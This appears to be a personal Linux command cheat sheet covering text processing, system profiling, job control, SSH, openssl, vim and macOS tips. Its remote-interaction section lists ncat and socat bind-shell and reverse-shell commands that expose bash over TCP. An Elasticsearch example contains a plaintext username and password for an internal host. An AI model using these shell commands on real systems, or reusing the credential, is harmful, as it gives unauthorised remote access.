####################### Text & File #################
## `sort`: order all lines in the file, lexicographically by default.
# `-n`: sort numerically; `-k`: sort by specified column; `-t`: declare the column delimiter; `-r`: descending order
sort -n -k 5 -t " " file.txt

## wc
# count by line
wc -l file.txt
# count by word
wc -w file.txt
# view file(not folder, symbolic link, etc.) amount in current directory.
ls -l [path]| grep "^-" | wc -l

##uniq
# group by line and count the number of same line.
uniq -c file.txt

## awk
# reference https://www.runoob.com/
# BEGIN{execute at the beginning, for just 1 time};
# {process each line};
# END{execute in the end, just once}
awk '{for(i=1;i<=NF;i++){if(NR==1){res[i]=$i;}else{res[i]=res[i]" "$i;}}};
    END{for(i=1;i<=NF;i++){print res[i]}}' file.txt # transposing

awk '{if(NR==10){print $0}}' file.txt # output line 10

awk '{for(i=1;i<=NF;i++){res[$i]++}};
    END{for(w in res){print w, res[w]};}' file.txt | sort -nr -k 2 # count words frequency TODO

awk '$0 ~ /^([0-9]{3}\-){2}[0-9]{4}$|^\([0-9]{3}\)\s[0-9]{3}\-[0-9]{4}$/' file.txt # phone number match

awk '{if($0 ~ /github\.com/){print $1"@"$2}}' go.mod # download github dependencies in `go.mod`

ls -l | awk '$1 !~ /^d.*/  {print $9}' | xargs wc -l | sort -nr -k 1 # order non-directory files by lines amount of their content

# `-F`: claim delimiter
# refer to https://juejin.cn/post/7055242139222949924
grep "parent" log.txt | awk -F "child\":\"" '{print $2}' | awk -F "\":\"" '{print $1" "$5}' | awk -F "\",\"name" '{print $1}' | sort -k 2 -r | head -n 25

## sed
# `-i`, replace string and update the file. `-e`, print content after substituting and not change the file.
sed -i "s/old_string/new_string/" file.txt
# print line 5-10.
sed -n '5,10p' file.txt

## `xargs`, handle multiple input lines with a command.
# default delimiter is `\n`. specify it using flag `-d`.
cat file.txt | xargs wget
cat file.txt | xargs -n1 -t

## `zcat`, decompress files to standard output.
# like `uncompress -c`
zcat api.log.gz | grep --binary-files=text '/app/content/config' | grep -a '1000976'

## chmod
chmod -R 600 [path]
chmod -R +x [path]

## ln
ln -s target_file link_file
# change target of link_file
ln -snf target_file link_file

## clear content of the file.
true >file.txt
cat /dev/null >file.txt
echo >file.txt

## grep
# -v exclude lines with certain word
grep -v "exclude_word" file.txt
# print lines around pattern line. -A4 4 lines after it. -B before it. -C before and after it.
grep -A4 "pattern" file.txt
# -E regular expression
grep -E "[0-9][a-z]" file.txt

# print first X lines
head -n 10 file.txt
# print last X lines
tail -n 10 file.txt

# enable interpretation of backslash escape character.`\n`, `\r` are escape sequences.
echo -e "\t\n"
# print env variable
echo ${VAR}
# print PID of current process
echo $$

# print with format
printf "%d - %d = %s" 12 1 "11"

# `od`, dump files in human-readable format, like binaries.
# default: octal. -c: ASCII. -x hex.
od -c file.txt
# hexdump, similar as `od`.

## `more`, view files in pagination.
# -[number], like -20, shows 20 lines per screenful.
more -c -20 file.txt

# list directory tree
tree /tmp
# `-a`, show hidden files and folders. `-L [num]` display depth of directory tree.
tree -L 2 -a /tmp

# print absolute path. output: /root/folder/file.txt
realpath file.txt
# print file type (ordinary file, folder, link, etc.)
file file.txt
# show comprehensive information of the file. like type, ctime, mtime, size, etc.
stat file.txt

# find files whose name matches the pattern in specified folder.
# `-type` file type. `-ctime` creation time. `-mtime` modification time.
find . -name "*.c"

# compress a file/folder to tar format
tar -cvf file.tar file.txt
# decompress or extract the .tar file
tar -xvf file.tar

# create directory recursively
mkdir -p parent/folder

####################### Profiling #################
##df
# view drive usage
df -hT
##du, disk usage
# show disk usage of subdirectories. `max-depth` declares the traversal depth level.
du -h --max-depth=1 ./*
# show size of current folder
du -hs [path]

## network traffic analysis
# https://www.scaler.com/topics/linux-monitor-network-traffic/
# https://www.cnblogs.com/nmap/p/9427260.html
cat /proc/net/dev
ifconfig
# show realtime traffic for each program
nethogs
# show realtime traffic for each tcp connection
iftop

## netstat
# install
apt install net-tools
netstat -lnap
# list all network adapters
netstat -i
# print the amount of different states for tcp.
# https://computingforgeeks.com/how-to-check-tcp-connections-states-in-linux-with-netstat/
netstat -nat | awk '{print $6}' | sort | uniq -c | sort -r
# print the amount of each tcp connection status
netstat -n | awk '/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}'

## lsof. list open file
# https://www.cnblogs.com/muchengnanfeng/p/9554993.html
# search by port
lsof -i:1234
# search by process id
lsof -p 1234

# show processes https://www.geeksforgeeks.org/ps-command-in-linux-with-examples/
# `-aux`, format: USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND
# TTY: short for teletype. the terminal file this process connects to.
ps -aux

# print Linux kernel version.
uname -a

# view resources usage limit for current user.
ulimit -a

# print CPU information
cat /proc/cpuinfo

####################### System #################
# create a new user, and a group with the same name by default.
# `-m`, create a directory in `/home`
useradd -m username
# configure the password(PIN) for a user
passwd username

####################### Run #################
# no hang up. continue running after existing the shell.
# > redirect the output.
# 0 standard input; 1 standard output; 2 standard error.
# & run program in the background.
nohup tmp.exe >log.txt 2>&1 &

## jobs. show background tasks.
jobs
# foreground specified job.
fg %1
# make specified job background.
bg %1
ctrl+z # halt execution of current foreground process.

## kill
# kill the No.1 background task. see the number in `jobs`.
kill %1
# list all signals.
kill -l

# https://linuxhandbook.com/here-input-redirections/
# `>`, `<`, input redirection
# `>>`, `<<`, convey multiple lines of input.
# `<<<`, convey single line of input.
cat output.txt <<< "1234"

####################### Remote Interaction #################
# generate key pair and copy to remote server.
ssh-keygen -t rsa
ssh-copy-id root@1.2.3.4
# login
ssh user@1.2.3.4
# scp src dst
scp file.txt root@1.2.3.4:/root
scp root@1.2.3.4:/root/file.txt .

## To generate more types of certificate, refer to internet docs.
# generate key
openssl genrsa -des3 -out server.key 2048
# show key's content
openssl rsa -text -in server.key
# generate doc for applying for certificate
openssl req -new -key server.key -out server.csr
# show doc's content
openssl req -text -in server.csr -noout
# generate certificate
openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt
# generate random base64 string
openssl rand -base64 21

## send file with GUI
yum install lrzsz
# send file from linux to remote machine
sz file.txt
# receive file from remote machine
rz

# install DNS tools like `dig`, `nslookup`.
apt install dnsutils

# ftp
ftp 1.2.3.4 # the interactive terminal will ask you username and password.
ftp -p 1.2.3.4 # use with passive mode.

## `ncat`
# Normal shell, `ncat` listens on server
ncat -l [port] -e /bin/bash
# then connect from client
ncat [remote_ip] [port]
# Reverse shell. `ncat` listens on client
ncat -l [port]
# then connect from server
ncat [local_ip] [port] -e /bin/bash

## `socat`
# Normal shell，`socat` listens on server
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp-listen:9999,bind=0.0.0.0,reuseaddr,fork
# then connect from client
socat file:`tty`,raw,echo=0 tcp:192.168.0.1:9999
# Reverse shell. `socat` listens on client
socat file:`tty`,raw,echo=0 tcp-listen:9999,bind=0.0.0.0,reuseaddr,fork
# then connect from server
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.0.10:9999

####################### Trifle #################
## package management.
# update package information to latest
apt update

## vim
# build Go developing env on vim. https://www.cnblogs.com/breg/p/5386365.html
vim .vimrc # configuration file of vim.
10gg # go to line 10.
G # jump to the end of the file.
^ # go to the start of the line.
$ # go to the end of the line.
10yy # copy next 10 lines from current line.
p # paste contents from clipboard.
10dd # delete following 10 lines from current line.
ctrl+v
U # undo last operation.
ctrl+r # recover undone operation.

# ES query
curl -H "Content-Type: application/json" -u elastic:gRYppQtdTpP3nFzH -XPOST 'http://172.16.5.146:9200/imissu/_doc/_search?pretty' -d '{
  "query": {
            "bool": {
              "should": [
                { "term": { "user_id": "10" } },
                { "term": { "stage_name": "10" } }
              ]
            }
  },
  "sort": {
    "_script": {
      "type": "number",
      "script": {
        "lang": "painless",
        "source": " if (doc.uk.value.contains(params.q)) { if (doc.sk.value.contains(params.q)) {return Math.min(doc.sk.value.length()*10+1,
doc.uk.value.length()*10);} else {return doc.uk.value.length()*10;}} else {return doc.sk.value.length()*10+1;}",
        "params": {
          "q": "10"
        }
      },
      "order": "asc"
    }
  }
}'

# proto generation
protoc --micro_out=. --go_out=. ./customer.proto

## `mutagen`, synchronize data between computers.
# installation
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
brew install mutagen-io/mutagen/mutagen
mutagen sync create --name=songzq --sync-mode=one-way-replica --ignore='output/' ~/work root@${IP}:~/work
mutagen daemon start
mutagen list
mutagen daemon stop

## register new service on Linux.
# `/usr/bin/systemd/system` service configurations location
sudo systemctl daemon-reload
sudo systemctl enable job.service
sudo systemctl start job.service

# print present time in particular pattern.
date "+%Y-%m-%d %H:%M:%S"

####################### Mac OS #################
# after switching to zsh on Mac, `/etc/profile` is not automatically executed.
# instead, `~/.zshrc` ,`/etc/zshenv` and `/etc/zshrc` get executed each time you log in.

# clear screen
cmd + k
# list processes
ps -lef
# show all files' size in current directory
du -sh *
